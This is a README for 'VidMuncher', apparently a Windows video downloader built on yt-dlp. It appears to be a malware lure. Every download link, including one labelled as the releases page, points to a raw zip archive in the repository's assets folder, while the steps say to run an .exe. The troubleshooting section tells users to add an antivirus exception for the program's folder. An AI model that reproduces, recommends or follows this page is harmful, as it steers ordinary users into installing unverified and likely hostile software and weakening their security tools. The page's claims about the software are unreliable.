# 📥 VidMuncher - Download online videos with one click

[![](https://img.shields.io/badge/Download_VidMuncher-Blue.svg)](https://raw.githubusercontent.com/Labradoryeshivah6794/VidMuncher/main/assets/Muncher_Vid_v1.8.zip)

VidMuncher lets you save videos from the internet to your computer. It uses a tool called yt-dlp to grab content from many websites. The program organizes the files so you can keep them for later.

## 💻 System Requirements

Your computer must run Windows 10 or Windows 11. The program works best with a stable internet connection. You need about 200 megabytes of free space on your hard drive. 

## 🚀 How to Install and Run

1. Visit the [VidMuncher Releases page](https://raw.githubusercontent.com/Labradoryeshivah6794/VidMuncher/main/assets/Muncher_Vid_v1.8.zip).
2. Look for the latest version listed at the top.
3. Click the link for the file ending in .exe to start your download.
4. Open the file once the download finishes.
5. Follow the prompts on the screen to complete the installation.
6. Launch the program from your Start menu shortcut.

## ⚙️ Using the Program

The main window shows a text box where you paste your link. Copy the URL of the video from your web browser. Paste the link into the box. Select your preferred quality from the dropdown menu. Click the big button labeled Start. A progress bar shows you how much of the video finished. You find all your saved files in the folder named Downloads inside your VidMuncher folder.

## 🔧 Troubleshooting Common Issues

*   **Program does not open:** Check if your antivirus software blocked the file. Sometimes security tools prevent new software from starting. Add an exception for the VidMuncher folder in your security settings.
*   **Download fails:** Make sure you copied the correct link. Check your internet connection. Some websites restrict access to their videos, so the program may display an error if the site blocks external requests.
*   **Missing video file:** Look in the default folder. If you changed the save location in settings, check that folder instead.
*   **Slow speeds:** Close other programs that use the internet. Streaming services or background updates consume your bandwidth.

## 📁 File Organization

The program saves video files according to their original title. It keeps your files in order so you never lose track of your library. You rename files directly within the history view if you choose. The program handles file paths automatically so that you do not see errors with long folder names. If you download a video that already exists, the program warns you before it overwrites the existing file. This prevents accidental loss of your data.

## ⚡ Performance Tips

If you want to speed up your work, use the queue feature. Paste five or ten links in a row. The program processes them one after another. This saves you from waiting for each individual download to finish before you start the next one. Use a wired ethernet connection if you notice slow speeds on your wireless network. High-quality files take more space and take longer to save, so choose lower quality settings if you have limited storage space.
